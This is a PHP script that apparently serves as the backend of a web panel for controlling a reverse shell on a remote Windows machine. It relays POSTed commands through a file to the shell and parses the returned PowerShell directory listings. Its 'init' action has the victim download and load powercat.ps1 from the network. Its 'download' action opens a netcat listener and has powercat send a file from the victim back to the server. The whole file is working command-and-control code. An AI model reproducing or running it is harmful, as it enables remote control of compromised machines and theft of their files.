<?php
$maxsleep = 5;
$fileTransferPort = 4243;
$outputfile = "../reverseresult";
$powercatFolder = ".";

class File
{
    public $mode;
    public $lastModifiedDay;
    public $lastModifiedTime;
    public $size = 0;
    public $name = "";
}

class DirectoryData
{
    public $directory = ".";
    public $files= array();
    
    public function initFromReverseResult($result) {
        $resAsArray = explode("\n", $result);
        $lines = array();
        foreach($resAsArray as $line){
            if (($line[0] == 'd') || (($line[0] == '-') && (substr($line, -1) != '-'))){
                // echo $line;
                // echo "\n";
                $attributes = explode(" ", preg_replace('/\s+/', ' ', $line));
                // echo count($attributes);
                $lineAsObject = new File;
                $lineAsObject->mode = $attributes[0];
                $lineAsObject->lastModifiedDay = $attributes[1];
                $lineAsObject->lastModifiedTime = $attributes[2];
                if ($line[0] == 'd'){
                    for ($i = 3; $i < count($attributes); $i++){
                        $lineAsObject->name .= ($i == 3 ? "" : " ") . $attributes[$i];
                    }
                } else {
                    $lineAsObject->size = $attributes[3];
                    for ($i = 4; $i < count($attributes); $i++){
                        $lineAsObject->name .= ($i == 4 ? "" : " ") . $attributes[$i];
                    }
                }
                $lines[] = $lineAsObject;
            }
            if (strpos($line, 'Directory') !== false) {
                $this->directory = trim(str_replace('Directory:', '', $line));
            }
        }
        $this->files = $lines;
    }
}

function writeToReverseShell($cmd, $outputfile, $maxsleep){
    $newfile = $outputfile . "-old";
    if (!copy($outputfile, $newfile)) {
        echo "La copie $newfile du fichier a échoué...\n";
    }
    
    clearstatcache();
    $mtime = filemtime($outputfile);
    
    $handle = fopen("../cmd/command", 'w') or die('Cannot open file:  '.$my_file);
    fwrite($handle, $cmd);
    fclose($handle);      
    
    $sleepcount = 0;
    clearstatcache();
    
    while ($mtime == filemtime($outputfile) && ($sleepcount < $maxsleep)){
        $sleepcount ++;
        sleep(1);
        clearstatcache();
    }
    
    if ($sleepcount != $maxsleep){  
        // Faire le diff entre fichiers et le retourner
        $fulloutput = file_get_contents($outputfile);
        $oldoutput = file_get_contents($newfile);
        $result = str_replace($oldoutput, "", $fulloutput);
        return $result;
    } else {
        return "Shell took too long to respond";
    }
}

if (isset($_POST['action'])) {
    if(!is_file($outputfile)){
        $myfile = fopen($outputfile, "w+");
    }
    
    switch($_POST['action']){
        case "logs":
            error_log("Received logs action");
            echo file_get_contents($outputfile);
        break;
        
        case "write":
            error_log("Received write action");
            if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                echo writeToReverseShell($_POST['command'], $outputfile, $maxsleep);
            }
        break;
        
        case "download":
            error_log("Received download action");
            session_write_close();
            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/test.pdf &");
            sleep(1);
            $fileToDownload = "/home/pierre/Documents/psl_lrm.pdf";
            $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $fileToDownload . '}';
            $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
            fwrite($handle, $cmd);
            fclose($handle);  
            // echo "saving file";
        break;
        
        case "init":
            error_log("Received init action");
            $cmd = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "./powercat.ps1"); . ./powercat.ps1';
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $powercatFolder = substr($result, 0, -2);
            echo $result;
        break;
        case "list":
            error_log("Received list action");
            $cmd = "Get-ChildItem -Force";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
        break;

        default:
        break;
    }
}
?>